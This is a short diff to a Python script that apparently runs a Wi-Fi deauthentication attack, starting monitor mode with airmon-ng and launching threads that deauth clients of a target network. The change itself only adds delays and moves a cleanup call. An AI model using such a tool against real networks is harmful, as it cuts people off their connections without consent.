@@ -261,17 +261,23 @@ def main():
     subprocess.run(["airmon-ng", "start", inter, hackchannel])
     
     threads = []
+    
+    time.sleep(2)
     for client in clients_to_deauth:
         t = threading.Thread(target=deauth_attack, args=[hackbssid, client, inter], daemon=True)
+        time.sleep(1)
         t.start()
         threads.append(t)
+
     try:
         while True:
             time.sleep(0.1)
+
     except KeyboardInterrupt:
         print(f"\n{purple}[#]{reset} Stopping Deauth..")
+        restore_managed_mode(inter)
 
-    restore_managed_mode(inter)
+    
 
 if __name__ == "__main__":
     main()
